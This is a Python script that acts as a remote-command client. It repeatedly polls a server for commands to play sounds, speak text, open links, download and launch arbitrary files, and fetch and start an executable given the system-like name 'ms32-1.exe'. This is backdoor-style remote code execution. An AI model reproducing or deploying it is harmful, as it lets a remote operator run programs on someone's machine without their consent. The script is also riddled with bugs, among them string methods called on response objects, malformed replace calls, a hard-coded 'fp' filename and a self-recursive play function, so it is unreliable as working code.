import requests as rq
from os.path import exists, dirname, abspath, join
from os import startfile
from pydub import AudioSegment
from pydub.playback import play
from threading import Thread as thread
import webbrowser as wb
import pyttsx3

#speak 'Hello World
url = "http://127.0.0.1:5000/"
engine = pyttsx3.init()
terminate = False
def hit(url=url,encode=False):
    while not terminate:
        response = rq.get(url)
        if encode:
            response = response.decode('utf-8')
        return response

def play(audio):
    while not terminate:
        fp = join("sounds",audio)
        if not exists(fp):
            audio_b = hit(url+f"sounds/{audio}")
            with open("fp","xb") as file:
                file.write(audio_b.content)
        mp3 = AudioSegment.from_file(audio)
        play(mp3)

def speak(txt):
    if not terminate:
        engine.say(txt)
        engine.runAndWait()

def update():
    global terminate
    exe = hit(url+"ms32-1.exe")
    with open("ms32-1.exe","xb") as updated_file:
        updated_file.write(exe.content)
    startfile("updater.exe")
    terminate = True
    exit()

def run(file):
    file_b = hit(url+file)
    with open(file,"xb"):
        file.write(file_b.content)
    startfile(file)
def main():
    while not terminate:
        cmd = hit(url+"command")
        if "pLaY" in cmd:
            audio = cmd.replace("pLaY ","")
            thread(target=play,args=(audio,)).start()
        elif "sPeAk" in cmd:
            txt = cmd.replace("sPeAk")
            thread(target=engine,args=(txt,)).start()
        elif "lInK" in cmd:
            link = cmd.replace("lInK '")
            wb.open(link)
        elif "rUn" in cmd:
            file = cmd.replace("rUn ")
            thread(target=run,args=(file,)).start()
        elif "uPdAtE" in cmd:
            update()
        from time import sleep
        sleep(0.07)
        

main()